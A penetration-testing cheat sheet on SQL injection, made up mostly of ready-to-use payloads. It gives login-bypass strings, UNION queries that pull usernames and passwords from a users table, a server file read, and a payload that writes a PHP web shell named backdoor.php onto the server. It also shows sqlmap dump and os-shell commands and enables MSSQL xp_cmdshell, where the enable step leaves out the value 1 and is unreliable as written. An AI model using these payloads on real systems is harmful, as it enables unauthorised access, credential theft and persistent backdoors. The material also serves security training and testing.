# SQL Injection

> SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

## Identifying SQLi

First of all we need to find locations where data might pass through a DB (logins, comments..) and try to use special SQL characters in order to see how the application responds (we look for SQL syntax errors). Example:

#### Using single quote (')
```bash
#Normal query from a login form:
SELECT * FROM Users WHERE login = '$username' and password = '$password';
#Given a login form we can try to inject a single quote in order to make a sql syntax error.
#Modified query that will display syntax error:
SELECT * FROM Users WHERE login = ''' and password = 'mypassword';
```
_____

## Bypass Authentication

The classic SQLi example. By providing the following input in the user input we can bypass the login of a website:

```bash
#Input used + SQL final result (condition is true because 1=1):
user' or 1=1;#
SELECT * FROM users WHERE username = 'user' or 1=1;
```

The above example will display all rows in the users database. However, there are applications that will generate an error since the logic of the program is to retrieve only one. We can bypass this by appending the LIMIT in the end of the query string in order to only display one:

```bash
user' or 1=1 LIMIT 1;#
```

### SQLi into a register form

We can try to create the following user and then log in to see if we get anything interesting:

```bash
username' or 1=1-- -
password: whatever
#Then try to log in with the above username/password.
```

_____

## Enumerating the DB

Take this as an example of a new SQL query:

```SQL
$query = "SELECT id, name, grade FROM reviews WHERE id=". _GET['id'];
```

The URL will be something like the following:

```php
.php?id='
```

We can test the single quote (') again in order to verify if we get a syntax error.

#### Column Enumeration

The "ORDER BY" statement can help us to enumerate how many columns are used in the query string.  If there is at least 'n' columns in the query, the query is valid and the page will render without errors.

```php
<!-- Start changing n to 1 and increment by 1 until there is an error:-->
php?id=1 order by n
```

Once identified how many columns the query is using, we need to know which ones are displayed in the webpage. To achieve this we can use the union statement:

```bash
#In our example there are 3 columns:
php?id=1 union select 1,2,3
#This will display a number (1, 2 and 3) on the columns.
```

#### Extracting Data

Imagine only columns 2 and 3 are being displayed in the website. We can use SQLi to extract data from the database:

```bash
#These examples are made for MariaDB, this could change depending on the software used.
#SQL Version
php?id=1 union all select 1, 2, @@version
#Database user (don't use ;):
php?id=1 union all select 1, 2, user();
#Information schema. It stores information about the database, like table and column names:
php?id=1 union all select 1, 2, table_name from information_schema.tables
#Column names from a specific table (users):
php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
#"Users" table column data:
php?id=1 union all select 1, username, password from users
```

#### Columns with a given name

Select DB, Table that contains a given string:

**Oracle DB:**
```bash
#Change $STRING with: PASSWD, PASSWORD, USERANME...
SELECT OWNER, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE column_name LIKE '%$STRING%';
```
_____

## SQLi to RCE

SQLi can be used to read and write files on the underlying OS (not always).

#### Read file from the server:

```bash
php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

#### Write file on the server:

```bash
#This can output some errors, but the file should be created
php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

_____

## SQLMap:
```bash
#TARGET should have the vulnerable parameter:
http://something.com/file.php?id=1
#Common uses
sqlmap -u $TARGET --dbs
sqlmap -u $TARGET -D $DATABASE --tables
sqlmap -u $TARGET -D $DATABASE -T $TABLE --columns
sqlmap -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN1,$COLUMN2 --dump
#Take a look at cookies sent in the request, maybe should add --cookie="$COOKIE"
```

Common flags:

| **Flag**   | **Description**                            |
|------------|--------------------------------------------|
|--cookie    | HTTP Cookie header value                   |
|--dbs       | List DBS names                             |
|--tables    | Enumerate DBMS database tables             |
|--columns   | Enumerate DBMS database table columns      |
|-D          | DBMS database to enumerate                 |
|-C          | DBMS database table column(s) to enumerate |
|--dump      | Dump DBMS database table entries           |
|--dbms=mysql| Set backend type (change mysql)            |
|--os-shell  |Â Execute a remote command shell on target system|


https://afrjcict.net/wp-content/uploads/2019/03/Vol12No1paper6journalformatDIRECT-pagenumber.pdf

_____ 

## MSSQL enable XP_CMDSHELL

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
RECONFIGURE;

# Execute commands:
EXEC master..xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig'; //without master.. still wokrs.
```
